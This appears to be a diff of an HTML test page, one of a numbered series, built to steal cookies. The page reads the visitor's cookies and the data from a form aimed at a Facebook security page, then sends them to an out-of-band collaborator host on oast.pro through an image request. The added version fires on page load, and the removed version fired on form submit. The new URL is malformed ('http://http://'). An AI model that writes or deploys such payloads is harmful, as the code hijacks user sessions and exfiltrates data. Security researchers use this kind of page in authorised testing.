@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>1Capture Form GET Cookies</title>
+    <title>108Capture Entire GET Request</title>
 </head>
 <body>
     <form id="myForm" method="GET" action="https://www.facebook.com:443/recent_emails/security/?hide_back_button=1&from_accounts_center=1">
@@ -12,25 +12,22 @@
         <input type="submit" value="Send">
     </form>
     <script>
-        // Function to capture form GET cookies
-        function captureFormGETCookies() {
+        // Function to capture entire GET request
+        function captureEntireGETRequest() {
+            var form = document.getElementById('myForm');
+            var formData = new FormData(form); // Extract form data
+            var queryString = new URLSearchParams(formData).toString(); // Convert form data to query string
             var cookies = document.cookie; // Get cookies from document
-            // Send the cookies to the Burp Suite collaborator
+            var actionUrl = form.getAttribute('action'); // Get form action URL
+            var fullUrl = actionUrl + '?' + queryString + '&' + encodeURIComponent(cookies); // Construct full URL with form data and cookies
+            // Send the full URL to the Burp Suite collaborator
             var img = new Image();
-            img.src = "http://co4oiq53nckmdhpt89g0rjnkujqxocigt.oast.pro?cookies=" + encodeURIComponent(cookies);
+            img.src = "http://http://co4oiq53nckmdhpt89g0rjnkujqxocigt.oast.pro?fullUrl=" + encodeURIComponent(fullUrl);
         }
 
-        // Function to intercept form submission and capture GET cookies
-        function interceptFormSubmission(event) {
-            event.preventDefault(); // Prevent the form from being submitted
-            captureFormGETCookies();
-            // Perform form submission (optional, if you want to submit the form)
-            //document.getElementById('myForm').submit();
-        }
-
-        // Call the function to intercept form submission when the page loads
+        // Function to capture entire GET request when the page loads
         window.onload = function() {
-            document.getElementById('myForm').addEventListener('submit', interceptFormSubmission);
+            captureEntireGETRequest();
         };
     </script>
 </body>
